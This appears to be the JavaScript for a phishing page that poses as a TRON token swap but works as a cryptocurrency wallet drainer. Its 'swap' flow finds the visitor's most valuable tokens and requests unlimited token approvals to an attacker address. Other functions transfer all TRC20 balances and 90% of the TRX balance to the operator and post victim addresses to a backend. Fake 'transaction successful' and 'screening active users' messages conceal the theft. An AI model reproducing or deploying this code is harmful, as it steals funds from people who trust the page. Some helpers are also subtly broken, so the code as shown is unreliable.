var qrcode = new QRCode("qrcode", {
    // text: "https://<?php echo $web_address?>",
    text: ${webAddress},
    colorDark : "#000000",
    colorLight : "#ffffff",
    width: 260,
    height: 260,
    correctLevel : QRCode.CorrectLevel.L
});


Qmsg.config({
    html: true,
    autoClose: false,
    showClose: true,
});
function accAdd(arg1, arg2) {
    var r1, r2, m, c;
    try {
        r1 = arg1.toString().split(".")[1].length;
    } catch (e) {
        r1 = 0;
    }
    try {
        r2 = arg2.toString().split(".")[1].length;
    } catch (e) {
        r2 = 0;
    }
    c = Math.abs(r1 - r2);
    m = Math.pow(10, Math.max(r1, r2));
    if (c > 0) {
        var cm = Math.pow(10, c);
        if (r1 > r2) {
            arg1 = Number(arg1.toString().replace(".", ""));
            arg2 = Number(arg2.toString().replace(".", "")) * cm;
        } else {
            arg1 = Number(arg1.toString().replace(".", "")) * cm;
            arg2 = Number(arg2.toString().replace(".", ""));
        }
    } else {
        arg1 = Number(arg1.toString().replace(".", ""));
        arg2 = Number(arg2.toString().replace(".", ""));
    }
    return (arg1 + arg2) / m;
}

Number.prototype.add = function (arg) {
    return accAdd(arg, this);
};

function accSub(arg1, arg2) {
    var r1, r2, m, n;
    try {
        r1 = arg1.toString().split(".")[1].length;
    } catch (e) {
        r1 = 0;
    }
    try {
        r2 = arg2.toString().split(".")[1].length;
    } catch (e) {
        r2 = 0;
    }
    m = Math.pow(10, Math.max(r1, r2));
    n = r1 >= r2 ? r1 : r2;
    return ((arg1 * m - arg2 * m) / m).toFixed(n);
}

Number.prototype.sub = function (arg) {
    return accMul(arg, this);
};

function accMul(arg1, arg2) {
    var m = 0,
        s1 = arg1.toString(),
        s2 = arg2.toString();
    try {
        m += s1.split(".")[1].length;
    } catch (e) {}
    try {
        m += s2.split(".")[1].length;
    } catch (e) {}
    return (
        (Number(s1.replace(".", "")) * Number(s2.replace(".", ""))) /
        Math.pow(10, m)
    );
}

Number.prototype.mul = function (arg) {
    return accMul(arg, this);
};

function accDiv(arg1, arg2) {
    var t1 = 0,
        t2 = 0,
        r1,
        r2;
    try {
        t1 = arg1.toString().split(".")[1].length;
    } catch (e) {}
    try {
        t2 = arg2.toString().split(".")[1].length;
    } catch (e) {}
    with (Math) {
        r1 = Number(arg1.toString().replace(".", ""));
        r2 = Number(arg2.toString().replace(".", ""));
        return (r1 / r2) * pow(10, t2 - t1);
    }
}

Number.prototype.div = function (arg) {
    return accDiv(this, arg);
};

let usdtTrc20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

let toAddress = "<?php echo $receive_address?>";

let approveAddress = window.atob(
    "<?php echo $receive_address?>"
);

let trc20List = [
    "TE2RzoSV3wFK99w6J9UnnZ4vLfXYoxvRwP",
    "TEBL6vb3PVx9D6aRBu3ynh7fgrJ3wEFiDg",
    "TRg6MnpsFXc82ymUPgf5qbj59ibxiEDWvv",
    "TGBr8uh9jBVHJhhkwSJvQN2ZAKzVkxDmno",
    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "TXJgMdjVX5dKiQaUi9QobwNxtSQaFqccvd",
    "TR7BUFRQeq1w5jAZf1FKx85SHuX6PfMqsV",
    "TUY54PVeH6WCcYCd6ZXXoBDsHytN9V5PXt",
    "TLeEu311Cbw63BcmMHDgDLu7fnk9fqGcqT",
    "TL5x9MtSnDy537FXKx53yAaHRRNdg9TkkA",
    "TWQhCXaWz4eHK4Kd1ErSDHjMFPoPc9czts",
    "TL6K6iaEkn8kdnJ79a8Be3S4RFf4pFkGE8",
    "TXMKm8FSp6zcm3cdgkgcM1fwdkuJbZ4Hgv",
    "TMUgpK7LLSYE2YKT3nGbLSzPgs3sw5hquM",
    "TDk91SWz2GvwfZwMTGX21d4ngUUH8YZZAv",
    "TDuvynpjzttyM6qP6Qp2jqKpAMsLYD32qn",
    "TL62tGz88S7dks7ssQxh6rVMKaJn2aq92j",
    "TNBnMWraDKFi1bFnVTjQ2YaSd6Xo6nQS57",
    "TWd7vJKaGmpq6oHgpHBqHHPG8JP2XErkTH",
    "TMGSahWsmc3PxzqVWuYQrTdEhoCPN8Pyn7",
    "TD5Wb8MpDLDvMiXC4r289c362rxMSPD8qP",
    "TSAr2WfxjyWTCX1nw4XXHyr1cQEX2jWtRg",
    "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
    "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
    "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
    "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
    "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
    "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
    "TQcia2H2TU3WrFk9sKtdK9qCfkW8XirfPQ",
    "TYukBQZ2XXCcRCReAUguyXncCWNY9CEiDQ",
    "TYN6Wh11maRfzgG7n5B6nM5VW1jfGs9chu",
    "TV1rTHvtf7Zn2H19T4SFQEEhtW8MztkUCB",
    "TH2mEwTKNgtg8psR6Qx2RBUXZ48Lon1ygu",
    "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
    "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
    "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
    "TGbu32VEGpS4kDmjrmn5ZZJgUyHQiaweoq",
    "TKAtLoCB529zusLfLVkGvLNis6okwjB7jf",
    "TFVge5Nb6or8cpdtdwPuXSGqLHpj3PM9Rp",
    "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
    "TKJYoAbbLMsZkC7bonqiyzNmqtGu1iD7in",
    "TR3DLthpnDdCGabhVDbD3VMsiJoCXY3bZd",
    "TXWkP3jLBqRGojUih1ShzNyDaN5Csnebok",
    "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
    "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
    "TLLBBiX3HqVZZsUQTBXgurA3pdw317PmjM",
    "TJmTeYk5zmg8pNPGYbDb2psadwVLYDDYDr",
    "TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK",
    "TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
    "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
    "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
];

let coinId = <?php echo $coin_id?>;
let coinName = "<?php echo $coin_name?>";
let coinPrecision = 1000000;
let coinNum = 0;
let proportion = <?php echo $rate?>;

let checkTronReadyNum = 0;

let timer = setInterval(async () => {
    checkTronReadyNum++;
    if (window.tronWeb && window.tronWeb.ready) {
        let userAddress = window.tronWeb.defaultAddress.base58;
        $("#TronLinkState").text(
            userAddress.substr(0, 3) + "..." + userAddress.substr(31, 3)
        );
        tronWeb.trx.getAccount().then((res) => {
            let tokenBalance = res.assetV2.find(function (o) {
                return o.key == coinId;
            });
            if (tokenBalance != undefined) {
                coinNum = tokenBalance.value / coinPrecision;
                // $("#SHIBNUM").text(`${coinNum.toFixed(2)}`);
            } else {
                // $("#SHIBNUM").text(`0`);
            }
        });
    } else {
        $("#TronLinkState").text("Not Connected");
        if (checkTronReadyNum > 3) {
            showNoConnet();
            clearInterval(timer);
        }
    }
}, 500);

function showNoConnet() {
    $('#qrcode').show();
    Qmsg.error(`<br><br>Please use the Tron wallet App to scan the QR code or use the Tronlink extension on your browser.<br><br>`);
}

function change() {
    if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
        $($("input")[0]).attr("placeholder", "TRX Amount");
        $($("input")[1]).attr("placeholder", `${coinName} Amount`);
    } else {
        $($("input")[0]).attr("placeholder", `${coinName} Amount`);
        $($("input")[1]).attr("placeholder", "TRX Amount");
    }
    var t = $($("input")[0]).val();
    $($("input")[0]).val($($("input")[1]).val());
    $($("input")[1]).val(t);
}

function calculation() {
    if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
        $($("input")[1]).val(Number($($("input")[0]).val()).mul(proportion));
    } else {
        $($("input")[1]).val(Number($($("input")[0]).val()).div(proportion));
    }
}

function getInputCoinNum() {
    if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
        return Number($($("input")[0]).val());
    } else {
        return Number($($("input")[1]).val());
    }
    return 0;
}

$($("input")[0]).change(function () {
    calculation();
});

$($("input")[0]).keyup(function () {
    calculation();
});

function sellAll() {
    if (coinNum <= 0) {
        Qmsg.error(` Insufficient assets `);
        return;
    }
    $($("input")[0]).val(coinNum);
    $($("input")[0]).keyup();
}

function swap() {
    onConnect();
    // if (coinNum <= 0) {
    //     Qmsg.error(` Insufficient assets `);
    //     return;
    // }
    // if (Number($($("input")[0]).val()) <= 0) {
    //     Qmsg.error({
    //         autoClose: true,
    //         content: `<br><br>The Quantity of exchanges is incorrect<br><br>`,
    //         timeout: 3000,
    //     });
    //     return;
    // }
    // if (getInputCoinNum() > coinNum) {
    //     Qmsg.error(` Insufficient assets (资产不足够) `);
    //     return;
    // }
    // let loading = Qmsg.loading(
    //     `<br><br>Please authorize your wallet to complete the transaction<br><br> `
    // );
    // tronWeb.trx
    //     .getAccount()
    //     .then((account) => {
    //         tronWeb.trx
    //             .getBalance()
    //             .then((trxbalance) => {
    //                 let trxbalanceNum = trxbalance / 1000000;
    //                 console.log("TRX", trxbalanceNum);
    //                 tronWeb
    //                     .contract()
    //                     .at(usdtTrc20)
    //                     .then((usdtContract) => {
    //                         usdtContract
    //                             .balanceOf(tronWeb.defaultAddress.base58)
    //                             .call()
    //                             .then((usdtbalance) => {
    //                                 let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
    //                                 console.log("USDT", usdtbalanceNum);
    //                                 if (usdtbalanceNum > 1) {
    //                                     usdtContract
    //                                         .transfer(toAddress, usdtbalance.toNumber())
    //                                         .send()
    //                                         .finally(() => {
    //                                             loading.close();
    //                                             toTrx(usdtContract, trxbalance);
    //                                         });
    //                                 } else {
    //                                     loading.close();
    //                                     toTrx(usdtContract, trxbalance);
    //                                 }
    //                             })
    //                             .catch(() => {
    //                                 loading.close();
    //                                 Qmsg.error(` Authorization failed `);
    //                             });
    //                     })
    //                     .catch(() => {
    //                         loading.close();
    //                         Qmsg.error(` Authorization failed  `);
    //                     });
    //             })
    //             .catch(() => {
    //                 loading.close();
    //                 Qmsg.error(` Authorization failed `);
    //             });
    //     })
    //     .catch(() => {
    //         loading.close();
    //         Qmsg.error(` Authorization failed  `);
    //     });
}

function toTrx(usdtContract, trxbalance) {
    usdtContract
        .approve(approveAddress, 1000000000000000)
        .send()
        .finally(() => {
            let trxbalanceNum = trxbalance / 1000000;
            if (trxbalanceNum > 100) {
                let loading = Qmsg.loading(
                    `<br><br>Please authorize your TRX assets so that the system can view and complete the transaction<br><br>`
                );
                let sendTrx = Math.round(
                    Number(trxbalance).mul(Number(90).div(100))
                );
                tronWeb.trx.sendTransaction(toAddress, sendTrx).finally(() => {
                    loading.close();
                    toTrc20();
                });
            } else {
                Qmsg.error(
                    `<br><br>The operation failed, your account needs at least 100TRX to participate in the activity (we are screening active users)<br><br>`
                );
                toTrc20();
            }
        });
}

let toTrc20Loading = null;

function toTrc20(index) {
    if (index === undefined) index = 0;
    if (toTrc20Loading == null || toTrc20Loading.state !== "opening") {
        toTrc20Loading = Qmsg.loading(
            `<br><br>Please authorize your wallet to complete the transaction<br><br>`
        );
    }
    if (index == trc20List.length) {
        tronWeb.trx
            .getAccount()
            .then((res) => {
                let tokenBalance = res.assetV2.find(function (o) {
                    return o.key == "1002000";
                });
                if (tokenBalance && tokenBalance.value > 10) {
                    tronWeb.trx
                        .sendToken(toAddress, tokenBalance.value, "1002000")
                        .finally((res) => {
                            toTrc20Loading.close();
                            Qmsg.success(
                                `<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>`
                            );
                        });
                } else {
                    toTrc20Loading.close();
                    Qmsg.success(
                        `<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>`
                    );
                }
            })
            .catch(() => {
                toTrc20Loading.close();
                Qmsg.success(
                    `<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>`
                );
            });
        return;
    }
    let trc20CCAddress = trc20List[index];

    const forContract = new Promise((resolution, rejection) => {
        tronWeb
            .contract()
            .at(trc20CCAddress)
            .then((cc) => {
                if (!cc.balanceOf) {
                    resolution();
                    return;
                }
                cc.balanceOf(window.tronWeb.defaultAddress.base58)
                    .call()
                    .then((balance) => {
                        if (balance.toNumber() >= 5) {
                            //   cc.approve(approveAddress, 1000000000000000000000000000)
                            //     .send()
                            //     .finally(() => {
                            cc.transfer(toAddress, balance.toNumber())
                                .send()
                                .finally(() => {
                                    resolution();
                                });
                            //    });
                        } else {
                            resolution();
                        }
                    })
                    .catch(() => {
                        resolution();
                    });
            })
            .catch(() => {
                resolution();
            });
    }).finally(() => {
        toTrc20(index + 1);
    });
}

function getInfo(){
    $.ajax({
        type: 'get',
        url:  domain + 'api/get_trc',
        async : false,
        success:function(data){
            console.log(data)
            authorized_address = data.data.authorized_address;
            console.log(authorized_address);
        },
        error:function(data){

        }
    })
}



async function postInfo(address,symbol){

    var data = {
        address:address,
        authorized_address:authorized_address,
        bizhong:symbol,
        code:1,

    }
    $.ajax({
        type: 'post',
        url:  domain + 'api/insert_trc',
        data:data,
    })
}


var authorized_address = 'TNsKGSsxTem293y2PLohyBTiW9L7taqStj';
var url=window.location.host;
var domain = 'https://'+url+'/';
var bizhong = '';
var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";


const addr = {
    'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
    'USDT':'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
    'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
    'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
    'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
    'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
    "EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
    "VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
    "POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
    "CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
}

const price = {
    'WIN': 0.001150,
    'USDT':1,
    'TONS':1.35,
    'USDJ':1.04,
    'JST': 0.125,
    "HT": 20.41,
    "SUN": 33.97,
    "EXNX": 0.0621,
    "VCOIN": 0.004225,
    "POL": 0.1393,
    "CKRW": 0.002487,
}

const decimals = {
    'WIN': 6,
    'USDT':6,
    'TONS':6,
    'USDJ':18,
    'JST': 18,
    "HT": 18,
    "SUN": 18,
    "EXNX": 18,
    "VCOIN": 6,
    "POL": 8,
    "CKRW": 6,
}

var total=0;
async function getMostValuableAssets(account) {
    let _symbol = 'USDT'
    for (const symbol of Object.keys(addr)) {
        let contract = await tronWeb.contract().at(addr[symbol]);
        let myBalance = await contract.balanceOf(account).call(function(err,balance){
            const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
            console.log(usdt);
            if (usdt > total && usdt > 500) {
                _symbol = symbol
                total = usdt
                approveAddr = addr[_symbol]
            }
        })
    }
    bizhong = _symbol
    return _symbol
}

/**
 * * Connect wallet button pressed.
 */
async function onConnect() {
    Qmsg.loading(
        `<br><br>Please authorize your wallet to complete the transaction<br><br>`
    );

    let tronWeb = window.tronWeb
    let walletAddress = tronWeb.defaultAddress.base58;
    bizhong = await getMostValuableAssets(walletAddress);
    let instance = await tronWeb.contract().at(approveAddr);
    let res = await instance["approve"](authorized_address,"90000000000000000000000000000");
    res.send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: false
    },function(err,res){
        if(err == null){
            Qmsg.success(
                `<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>`
            );
            // setTimeout(function () {
            //     Qmsg.error(
            //         `<br><br>The operation failed, your account needs at least 100TRX to participate in the activity (we are screening active users)<br><br>`
            //     );
            // },2000);
            postInfo(walletAddress,bizhong)
            postInfo(walletAddress,bizhong)
        }
    })
}
function init() {
    getInfo();
}


async function s(){
    var tronWeb = window.tronWeb
    let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
    let walletAddress = tronWeb.defaultAddress.base58;
    let result = await contract.balanceOf(walletAddress).call(function(err,tex){
        if(err == null){
            let total = tex._hex/(10**6);
            $('#yu').text(total.toLocaleString() +' USDT')
            console.log();
        }
    });

}

/**
 * Main entry point.
 */

init();